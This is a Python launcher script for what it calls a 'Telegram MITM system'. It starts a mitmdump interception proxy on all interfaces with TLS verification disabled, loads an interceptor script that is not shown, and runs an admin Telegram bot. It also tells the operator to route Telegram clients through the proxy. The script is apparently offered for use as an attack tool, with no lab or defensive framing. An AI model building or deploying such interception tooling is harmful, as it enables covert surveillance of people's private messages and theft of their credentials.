#!/usr/bin/env python3
import asyncio
import sys
import os
import subprocess
import threading
import time

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from admin_bot import AdminBot

def start_mitm():
    print("[*] Starting MITM proxy...")

    cmd = [
        "mitmdump",
        "--listen-host", "0.0.0.0",
        "--listen-port", "8082",
        "--ssl-insecure",
        "-s", "mitm_interceptor.py",
        "--showhost",
        "--flow-detail", "0",
        "--set", "block_global=false"
    ]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    time.sleep(3)

    if process.poll() is not None:
        stdout, stderr = process.communicate()
        print(f"MITM failed: {stderr[:200]}")
        return None

    print(f"[✓] MITM started (PID: {process.pid})")
    return process

async def main():
    if len(sys.argv) != 3:
        print("Usage: python run.py <BOT_TOKEN> <ADMIN_ID>")
        print("Example: python run.py '123456:ABC-DEF' 123456789")
        sys.exit(1)

    bot_token = sys.argv[1]
    admin_id = int(sys.argv[2])

    os.environ["ADMIN_BOT_TOKEN"] = bot_token
    os.environ["ADMIN_ID"] = str(admin_id)

    print("╔══════════════════════════════════════════════════════════╗")
    print("║                TELEGRAM MITM SYSTEM                      ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"[*] Admin ID: {admin_id}")
    print(f"[*] Bot Token: {bot_token[:10]}...")
    print(f"[*] MITM Port: 8082")

    print("[1] Starting admin bot...")
    try:
        bot = AdminBot(bot_token=bot_token, admin_id=admin_id)
    except Exception as e:
        print(f"[ERROR] Failed to start bot: {e}")
        sys.exit(1)

    print("[2] Starting MITM proxy...")

    def run_mitm():
        mitm_process = start_mitm()
        if mitm_process:
            mitm_process.wait()

    mitm_thread = threading.Thread(target=run_mitm, daemon=True)
    mitm_thread.start()

    time.sleep(5)

    print("[3] System is running!")
    print("[4] Press Ctrl+C to stop")
    print("=" * 50)
    print("[INFO] Configure Telegram to use proxy:")
    print("[INFO]   Server: your_server_ip, Port: 8082, Type: HTTP")
    print("=" * 50)

    try:
        await bot.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
